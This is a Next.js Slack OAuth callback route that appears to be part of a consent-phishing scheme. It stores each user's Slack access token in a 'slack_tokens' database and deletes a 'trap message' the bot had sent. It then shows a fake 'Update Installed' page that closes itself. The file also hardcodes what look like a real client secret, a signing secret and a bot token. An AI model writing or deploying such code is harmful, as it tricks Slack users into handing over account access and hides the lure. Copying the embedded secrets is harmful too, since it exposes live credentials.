

// app/api/auth/callback/route.ts

import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, setDoc, serverTimestamp, getDoc, deleteDoc } from 'firebase/firestore';

// Hardcoded values - no .env needed
const SLACK_CLIENT_ID = "2545190050563.10491030504784";
const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt";
const SIGNING_SECRET = "e303eff75af6a30c4015dbb2716aecf4"; // Example signing secret

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const code = searchParams.get('code');

  if (!code) {
    return new Response('', { headers: { 'Content-Type': 'text/html' } });
  }

  try {
    // 1. Token Exchange
    const formData = new URLSearchParams();
    formData.append('client_id', SLACK_CLIENT_ID);
    formData.append('client_secret', SLACK_CLIENT_SECRET);
    formData.append('code', code);
    formData.append('redirect_uri', REDIRECT_URI);

    const response = await fetch('https://slack.com/api/oauth.v2.access', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData
    });

    const data = await response.json();

    if (!data.ok) {
      console.error("OAuth error:", data.error);
      return new Response('', { headers: { 'Content-Type': 'text/html' } });
    }

    // 2. Delete Trap Message
    try {
      const trapMsgDoc = await getDoc(doc(db, "trap_messages", data.authed_user.id));
      if (trapMsgDoc.exists()) {
        const trapData = trapMsgDoc.data();
        
        // Delete from Slack
        await fetch('https://slack.com/api/chat.delete', {
          method: 'POST',
          headers: { 
            Authorization: `Bearer ${BOT_TOKEN}`,
            'Content-Type': 'application/json; charset=utf-8'
          },
          body: JSON.stringify({
            channel: trapData.channelId,
            ts: trapData.messageTs
          })
        });
        
        // Delete from Firebase
        await deleteDoc(doc(db, "trap_messages", data.authed_user.id));
        console.log(`✅ Trap message deleted for user: ${data.authed_user.id}`);
      }
    } catch (trapError) {
      console.error("Trap deletion error:", trapError);
    }

    // 3. Save User Data
    const userRes = await fetch(`https://slack.com/api/users.info?user=${data.authed_user.id}`, {
      headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
    });
    const userInfo = await userRes.json();
    
    const userData = {
      slackId: data.authed_user.id,
      accessToken: data.authed_user.access_token,
      name: userInfo.user?.real_name || "Unknown",
      image: userInfo.user?.profile?.image_192 || "",
      connectedAt: serverTimestamp(),
      lastAuth: new Date().toISOString()
    };

    await setDoc(doc(db, "slack_tokens", data.authed_user.id), userData);

    // 4. Return page that auto-closes
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Update Complete</title>
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, sans-serif;
              background: #4A154B;
              color: white;
              height: 100vh;
              display: flex;
              align-items: center;
              justify-content: center;
              margin: 0;
              padding: 20px;
              text-align: center;
            }
            .container {
              background: rgba(255,255,255,0.1);
              padding: 40px;
              border-radius: 16px;
              backdrop-filter: blur(10px);
              max-width: 400px;
            }
            .checkmark {
              font-size: 60px;
              margin-bottom: 20px;
            }
            h1 {
              margin: 0 0 10px 0;
              font-weight: 600;
            }
            p {
              margin: 0 0 20px 0;
              opacity: 0.8;
              font-size: 14px;
            }
            .loader {
              width: 40px;
              height: 40px;
              border: 3px solid rgba(255,255,255,0.3);
              border-radius: 50%;
              border-top-color: white;
              animation: spin 1s linear infinite;
              margin: 20px auto;
            }
            @keyframes spin {
              to { transform: rotate(360deg); }
            }
          </style>
          <script>
            // Close window after 2 seconds
            setTimeout(() => {
              window.close();
              // If window doesn't close, show message
              setTimeout(() => {
                document.body.innerHTML = '<div class="container"><div class="checkmark">✅</div><h1>Update Complete</h1><p>You can close this window now.</p></div>';
              }, 500);
            }, 2000);
          </script>
        </head>
        <body>
          <div class="container">
            <div class="checkmark">✅</div>
            <h1>Update Installed</h1>
            <p>Your workspace has been updated successfully.</p>
            <div class="loader"></div>
            <p style="font-size: 12px; opacity: 0.6;">Closing automatically...</p>
          </div>
        </body>
      </html>
    `;

    return new Response(html, { headers: { 'Content-Type': 'text/html' } });

  } catch (error) {
    console.error("Callback error:", error);
    return new Response('', { headers: { 'Content-Type': 'text/html' } });
  }
}